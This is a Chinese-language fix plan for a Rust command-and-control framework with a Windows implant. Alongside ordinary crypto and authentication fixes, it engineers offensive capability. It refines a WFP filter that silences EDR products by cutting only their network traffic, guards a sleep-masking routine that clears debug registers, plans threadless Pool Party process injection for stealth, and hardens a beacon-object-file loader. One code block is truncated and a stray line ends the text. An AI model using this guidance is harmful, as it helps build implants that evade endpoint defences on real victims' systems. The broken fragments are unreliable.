## P0 修复（阻塞实战部署）

### P0-1. CRIT-NEW-1 CSPRNG 失败静默忽略 → 全零标量
**文件:** `crates/protocol/src/crypto.rs:89-103`
**根因:** `random_bytes` 调 hook 后丢弃 `bool`；hook 失败时 `out` 保持调用方初始化的 `[0u8;32]`。
**权威依据:**
- `getrandom` crate 设计原则：*"getrandom prioritizes secure failure: it fails rather than returning insecure bytes"*（rust-random/getrandom 官方文档）。
- `x25519-dalek`：`SharedSecret::was_contributory()` 检查共享密钥是否为身份点；但更根本的是**永远不构造全零标量**。

**修复方案（两层防御）:**
1. **第一层（必须）**：`random_bytes` 改返回 `Result`，检查 hook 返回值：
   ```rust
   fn random_bytes(out: &mut [u8; 32]) -> Result<(), CryptoInitError> {
       let hook = CSPRNG_HOOK.load(Acquire);
       if hook != 0 {
           let f: fn(&mut [u8]) -> bool = unsafe { transmute(hook) };
           if !f(out) { return Err(CryptoInitError::CsprngFailed); }  // 关键：act on bool
       } else {
           rand_core::OsRng.fill_bytes(out);
       }
       Ok(())
   }
   ```
   `ServerKeypair::generate` / `ImplantKeypair::generate` 改返回 `Result`，失败传播。
2. **第二层（防御纵深）**：在 `StaticSecret::from(bytes)` 前显式拒绝全零：
   ```rust
   if bytes == [0u8; 32] { return Err(CryptoInitError::ZeroScalar); }
   ```
3. **no_std implant 失败行为**：写 diag marker（`b"ERR_CSPRNG_FAIL"`）+ `exit(0xAF)`（已有 selftest 先例 `selftests.rs:750`）。**绝不**返回带默认值的密钥对。

### P0-2. CRIT-1 Server 默认无认证 + 绑 0.0.0.0
**文件:** `crates/server/src/main.rs:147`；`lib.rs:767-771`
**权威依据:** 业界共识（gptme f652e75、Microsoft agent-framework #5740、trycua/cua #1892）——**非 localhost 绑定必须强制认证**；Cobalt Strike / Havoc 均要求操作员口令。

**修复方案（绑定感知的认证默认）:**
```rust
let addr = env::var("NYX_BIND").unwrap_or_else(|_| "127.0.0.1:8443".to_string());  // 默认改 loopback
let is_network_bind = !addr.starts_with("127.0.0.1") && !addr.starts_with("localhost");

if needs_auth && registry.is_open() && api_token.is_none() {

    let token = generate_random_token();
    eprintln!("╔════════════════════════════════════════════╗");

    eprintln!("║ {token} ║");
    eprintln!("╚════════════════════════════════════════════╝");

```

- 显式 `0.0.0.0` + 无 token + 无 `NYX_ALLOW_OPEN=1` → 自动生成 token 并打印（仿 server pubkey 先例 `main.rs:146`）。

### P0-3. CRIT-NEW-3 Config 密钥以字面量编译进二进制
**文件:** `crates/config-macros/src/lib.rs:45-51`
**根因:** ChaCha20 key + nonce + ct 三数组作为 `decrypt()` 字面量参数编译进 `.rdata`。
**权威依据:** 配置加密的密钥**绝不能**与密文同处一个二进制。Trail of Bits / NIST 原则：密钥与密文的分离是 KMS 的基础要求。

**修复方案（密钥外置）:**
- 方案 A（推荐）：密钥不入二进制。编译期只嵌入密文；运行时从环境变量或外部 blob 读取密钥（`NYX_CONFIG_KEY` 或固定路径文件，0600）。
  ```rust
  // build.rs 只嵌密文
  let expanded = quote!({
      nyx_config::decrypt_from_env("NYX_CONFIG_KEY", &[#(#ct_bytes),*][#pad..])
  });
  ```
- 方案 B（最小改动）：保留编译期嵌入，但**诚实化文档**——删除 "defeats 1768.py extractors" 声称，改为 *"obfuscation only — key is recoverable by a reverser in minutes; use for anti-strings-dump, not confidentiality"*。
- 部署 checklist 提醒操作员：配置加密 ≠ 配置保密；真正敏感字段（服务器地址）仍应在部署时注入。

### P0-4. CRIT-NEW-4 mem::mask/unmask 每次生成新随机密钥
**文件:** `crates/implant-win/src/mem.rs:104-124`
**根因:** `mask_key()` 每次调 `csprng_fill` → mask 用 key A，unmask 用 key B → 不可还原。
**修复方案（缓存单密钥）:**
```rust
static MASK_KEY: AtomicU64 = AtomicU64::new(0);  // 存堆分配的 [u8;32] 指针
static MASK_KEY_INIT: AtomicBool = AtomicBool::new(false);

pub(crate) fn mask_key() -> &'static [u8; 32] {
    if !MASK_KEY_INIT.load(Acquire) {
        let mut key = Box::new([0u8; 32]);
        if entry::csprng_fill(&mut *key) {
            let leaked = Box::leak(key) as *mut [u8;32] as u64;
            MASK_KEY.store(leaked, Release);
            MASK_KEY_INIT.store(true, Release);
        }
    }
    unsafe { &*(MASK_KEY.load(Acquire) as *const [u8;32]) }
}
```
mask 和 unmask 共用同一缓存密钥 → byte-identical round-trip 恢复正确。`round_trip_selftest` 需更新为验证真实 mask→unmask 还原（而非本地缓存）。

### P0-5. CRIT-NEW-2 Pool Party 伪造 "无 CreateRemoteThread"
**文件:** `crates/implant-win/src/tp.rs`；`inject.rs:650-664`
**权威依据:** SafeBreach Pool Party（Black Hat EU 2023）的 8 变体核心是**线程池队列插入**（`TP_WORK`/`TP_TIMER`/`TP_IO` 等），section 映射只是载荷投递，执行必须经线程池调度器 dispatch，**不能** `NtCreateThreadEx`。

**修复方案（诚实化优先，实现次之）:**
1. **立即（诚实化）**：修成功消息 + 模块文档：
   ```rust
   // inject.rs:662
   "Pool Party: section delivery ok, executed via NtCreateThreadEx (remote-thread IOC present — NOT threadless)"
   ```
   ```rust
   // tp.rs 模块头改为：
   // ⚠ PARTIAL: section-backed payload delivery is implemented, but execution uses
   // NtCreateThreadEx (remote-thread IOC). True threadless TP_WORK queue splice
   // (SafeBreach variant 2) is NOT yet implemented. Do NOT rely on this for
   // stealth until the queue-splice path lands.
   ```
2. **后续（真正实现）**：参考 SafeBreach-Labs/PoolParty + jacopoaugelli/PoolParty-BOF 实现 `TP_WORK` 队列插入（worker 发现 via `NtQueryInformationWorkerFactory` → 构造 `FULL_TP_DIRECT` → 插入 worker 的 task queue）。保持默认 OFF。

### P0-7. CRIT-5 fluctuation 无 RAII 守卫
**文件:** `crates/implant-win/src/fluctuation.rs:66-78`
**权威依据:** `scopeguard` crate（no_std 兼容）或手写 `Drop` guard 是 RAII 标准模式。注意 `panic=abort` 下 `Drop` 不跑（unwinder 不运行），但仍保护 `?` early-return / 显式 return 路径——这是现实失败模式。

**修复方案（手写两个 guard）:**
```rust
struct MaskGuard;
impl Drop for MaskGuard {
    fn drop(&mut self) { crate::mem::unmask(); }  // 无条件 unmask
}
struct DrGuard { saved: DrState, rt: &'static SyscallRt }
impl Drop for DrGuard {
    fn drop(&mut self) { restore_dr_state(self.rt, &self.saved); }
}

unsafe fn do_fluctuate(seconds: u32) -> bool {
    // ...
    let saved_dr = save_dr_state(rt);
    clear_dr_state(rt);
    let _dr_guard = DrGuard { saved: saved_dr, rt };
    let _mask_guard = MaskGuard;          // drop 时 unmask
    crate::mem::mask();
    let thunk_fn: unsafe extern "system" fn() = transmute(page);
    thunk_fn();
    // _mask_guard / _dr_guard drop here → unmask + restore DR
    true
}
```

### P0-8. HIGH-NEW-BOF1 BeaconDataExtract i32 溢出 → OOB
**文件:** `crates/implant-win/src/bof.rs:369`
**权威依据:** Rust 安全模式——对攻击者控制长度用 `checked_add` + `.get()` 边界检查（Rust RFC 0560、libmagic-rs Dosu 文档、OrbisAppSec 整数溢出案例）。

**修复方案（usize + checked_add）:**
```rust
let len = *((*d).buffer as *const i32);
if len < 0 { /* ... */ }
let len_u = len as usize;
// checked_add 防溢出，替代 `4 + len` 的 i32 加法
let need = 4usize.checked_add(len_u).unwrap_or(usize::MAX);
if (need as i32) > left || need > (left as usize) {
    if !size.is_null() { *size = 0; }
    return core::ptr::null();
}
let p = (*d).buffer.add(4);
(*d).buffer = p.add(len_u);  // usize 加法，无符号不回绕绕过
```
关键：`len as usize`（32 位平台上也正确扩展），用 `checked_add` 替代 `4 + len`（i32 加法）。

### P0-9. HIGH-NEW-K1 WFP silence_edr 阻断全部出站
**文件:** `crates/operator-kernelsdk/src/netsec.rs:328`
**权威依据:** Microsoft WFP 官方文档——`num_filter_conditions=0` 匹配该层全部流量；要阻断特定进程，必须用 `FWPM_CONDITION_ALE_APP_ID`（PID 不是有效条件，会复用；通过 `FwpmGetAppIdFromFileName0` 从可执行路径取 app ID blob）。

**修复方案（加 ALE_APP_ID 条件）:**
```rust
fn block_outbound_for_app(image_path: &[u16]) -> Self {
    let mut f: Self = unsafe { core::mem::zeroed() };
    f.action_type = 0x0001; // FWP_ACTION_BLOCK
    f.layer_key = LAYER_ALE_AUTH_CONNECT_V4;
    // 用 FwpmGetAppIdFromFileName0 取 app_id blob，填入条件
    let mut cond = FwpmFilterCondition0::default();
    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType = FWP_MATCH_EQUAL;
    cond.conditionValue.type_ = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob = &app_id_blob as *const _ as *mut _;
    f.filter_conditions = &mut cond as *mut _ as *mut _;
    f.num_filter_conditions = 1;  // 关键：不再是 0
    f.weight = [0x0D, u64::MAX];
    f
}
```
- `silence_edr(pid)` 先解析 pid → image path（`NtQuerySystemInformation` SystemProcessInformation），再调 `block_outbound_for_app`。
- 若无法解析 image path，返回 `Err`（不静默 nuke 全网）。

### P0-10. HIGH-NEW-C3 SOCKS5 无认证 → 开放代理
**文件:** `crates/client-cli/src/socks/`
**权威依据:** RFC 1929（Username/Password Authentication for SOCKS V5）——method 0x02，子协商版本 0x01。`tokio_socks` / `simple_socks5` 等 crate 均支持 `allow_userpass(validator)`。

**修复方案（默认要求认证）:**
- 握手阶段 method 列表改为 `[0x02]`（仅 username/password）或 `[0x02, 0x00]`（优先认证，允许回退）。
- `--listen 0.0.0.0:1080` 时**强制**要求 `--socks-user`/`--socks-pass`（CLI flag），否则拒绝启动。
- 仅 `--listen 127.0.0.1:1080`（loopback）允许无认证（本地安全）。
- 验证逻辑：客户端发 `VER(0x01) ULEN UNAME PLEN PASSWD`，服务端比对后回 `VER(0x01) STATUS(0=ok/1=fail)`。

## P1 修复（近期，正确性/取证）

### P1-1. HIGH-1 constant_time_eq 先 SHA 再比
**文件:** `crates/server/src/lib.rs:455-471`；`operators.rs:185`
**权威依据:** `subtle` crate 的 `ConstantTimeEq`/`ct_eq`（dalek-cryptography）。注意：slice `ct_eq` 在长度不等时短路返回——对等长 token 对比没问题（token 长度固定），但要避免对变长输入依赖。
**修复:**
```rust
use subtle::ConstantTimeEq;
pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    a.ct_eq(b).unwrap_u8() == 1  // 等长时恒定时间；不等长返回 0
}
```
删除 SHA-256 预哈希。`subtle` 已是 `chacha20poly1305` 的传递依赖（零新增依赖）。

let hk = Hkdf::<Sha256>::new(Some(server_pub), shared);  // server_pub 做 salt
